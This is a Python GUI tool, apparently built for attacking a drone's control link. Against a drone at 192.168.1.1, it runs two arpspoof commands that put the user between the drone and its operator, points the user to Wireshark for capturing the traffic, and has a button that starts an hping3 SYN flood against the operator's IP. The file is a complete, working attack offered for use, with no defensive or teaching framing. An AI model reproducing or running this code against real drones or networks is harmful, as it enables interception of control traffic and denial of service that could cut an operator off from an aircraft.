import subprocess
import customtkinter
import re
from CTkMessagebox import CTkMessagebox

customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("green")

# Fixed variable for drone IP
drone_ip = "192.168.1.1"

# Regular expression for validating IPv4 addresses
ipv4_regex = r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"

def validate_ip(ip):
    return bool(re.match(ipv4_regex, ip))

def start_arp_spoof():
    operator_ip = operator_entry.get()

    if not validate_ip(operator_ip):
        CTkMessagebox(title="Alert", message="Invalid IP address. Please enter a valid IPv4 address for the operator.",
                      icon="cancel")
        print("Invalid IP address. Please enter a valid IPv4 address for the operator.")
        return

    command1 = f"arpspoof -i wlan0 -t {drone_ip} {operator_ip}"
    command2 = f"arpspoof -i wlan0 -t {operator_ip} {drone_ip}"

    global arp_spoof_process1, arp_spoof_process2
    arp_spoof_process1 = subprocess.Popen(command1, shell=True)
    arp_spoof_process2 = subprocess.Popen(command2, shell=True)

    CTkMessagebox(title="Success", message="ARP Spoofing is running. Use Wireshark to analyze captured packets.",
                  icon="check")

def stop_arp_spoof():
    if arp_spoof_process1:
        arp_spoof_process1.terminate()
    if arp_spoof_process2:
        arp_spoof_process2.terminate()
    CTkMessagebox(title="Success", message="ARP Spoofing has been stopped.", icon="check")

def start_dos_attack():
    operator_ip = operator_entry.get()

    if not validate_ip(operator_ip):
        CTkMessagebox(title="Alert", message="Invalid IP address. Please enter a valid IPv4 address for the operator.",
                      icon="cancel")
        print("Invalid IP address. Please enter a valid IPv4 address for the operator.")
        return

    dos_command = f"hping3 -S --flood -V {operator_ip}"
    subprocess.Popen(dos_command, shell=True)
    CTkMessagebox(title="Success", message="DoS attack is running on the operator IP.", icon="check")

root = customtkinter.CTk()
root.geometry("850x500")
root.title("ARP Spoofing Tool")

drone_label = customtkinter.CTkLabel(root, text=f"Drone IP:  {drone_ip}")
drone_label.grid(row=0, column=0)

operator_label = customtkinter.CTkLabel(root, text="Operator IP:  ")
operator_label.grid(row=1, column=0)
operator_entry = customtkinter.CTkEntry(root)
operator_entry.grid(row=1, column=1)

start_arp_button = customtkinter.CTkButton(root, text="Start ARP Spoofing", command=start_arp_spoof)
start_arp_button.grid(row=2, columnspan=2)

stop_arp_button = customtkinter.CTkButton(root, text="Stop ARP Spoofing", command=stop_arp_spoof)
stop_arp_button.grid(row=3, columnspan=2)

start_dos_button = customtkinter.CTkButton(root, text="Start DoS Attack on Operator", command=start_dos_attack)
start_dos_button.grid(row=4, columnspan=2)

root.mainloop()

